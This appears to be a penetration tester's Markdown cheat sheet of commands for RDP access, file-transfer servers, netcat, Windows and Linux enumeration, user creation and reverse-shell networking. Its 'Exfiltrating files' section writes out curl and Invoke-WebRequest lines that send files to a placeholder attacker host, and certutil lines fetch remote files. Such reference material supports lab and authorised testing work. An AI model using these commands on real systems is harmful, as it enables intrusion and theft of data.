---
title: Home
layout: default
---

# General

## Connect to RDP

```bash
# add resolution support
xfreerdp3 /u:user /p:pass /v:<IP> /dynamic-resolution
# add clipboard support
xfreerdp3 /u:user /p:pass /v:<IP> +clipboard
# add a share for easily trasnfer files
xfreerdp3 /u:user /p:pass /v:<IP> /drive:<name>,<path> 
```

## File Transfer

### HTTP Server

```bash
# simple python server
python -m http.server <port>
# simple python upload-enabled server (optional basic auth)
pip install uploadserver
python -m uploadserver --basic-auth user:pass <port>

# WebDAV server
wsgidav -H 0.0.0.0 -p 80 --auth anonymous -r .

# Apache (copy files to /var/www/html)
sudo systemctl start apache2
```

### SMB Server

```bash
impacket-smbserver -smb2support share $(pwd) 
# win 10+ Compatibility (With Authentication)
impacket-smbserver -smb2support -user test -password test share $(pwd) 
```

### Netcat

```bash
# start a listener (nc|nc.exe)
nc -lvnp <port> > received_file

# send the file
nc <ip> <port> < <file_path>
```

### Downloading files on Windows

```bash
# PowerShell
iwr -uri <uri> -outfile <filename>

# cmd
certutil -urlcache -split -f <uri> <dest>

# copy from smb share
copy \\<ip>\share\<file>

# mount share before copy. (win 10+ w/o Authentication)
net use Z: \\<ip>\share
# mount share before copy. (win 10+ w/ Authentication)
net use Z: \\<ip>\share /u:user 'pass'
```

### Exfiltrating files from Windows

```bash
# send file to python upload-enabled server
Invoke-WebRequest -Uri http://<linux-ip>:<port>/upload -Method Post -InFile C:\path\to\file
curl -F "file=@C:\path\to\file.txt" http://<linux-ip>:<port> -u user:pass

# copy to smb share
copy C:\path\to\file \\<ip>\share
```

### Downloading files on Linux

```bash
# wget and curl
wget http://<ip>:<port>/<file>
curl -O http://<ip>:<port>/<file>
```

## Windows

### Utils

```bash
# search for a word in a file 
Select-String -Path "sb.txt" -Pattern "password"

# enum permissions
icacls "<path>"
Get-ACL "<path>"

# kill a process
taskkill /F /IM chisel.exe
# or by PID
tasklist | findstr chisel.exe
taskkill /PID <PID> /F
```

### Users

```bash
# enum users and groups
net user <user>
net localgroup <group>

# create local user and add it to a group
net user <user> <pass> /add
net localgroup <group> <user> /add

# change local user's password
net user <user> <newpass>
```

## Linux

### Users

```bash
useradd -u <UID> -g <group> <uname>
```

### Connections

```bash
# log incoming traffic on a specific port
sudo tcpdump -nvvvXi tun0 tcp port 8080

# network connections
netstat -antp # check tcp conns on all sockets
ss -ntplu # check tcp and udp listening conns

# kill connection
fuser -k <port>/tcp
fuser -k <port>/udp
kill -9 <PID>
```

### SSH

```bash
# create keys
ssh-keygen -t rsa -b 4096
```

### Misc

```bash
# reduce binary size (util for binaries that are going to be transfered)
upx <bin_path>
```

## VPN

Reduce MTU if rever shells not connecting back.

```bash
ifconfig tun0 mtu 1200
```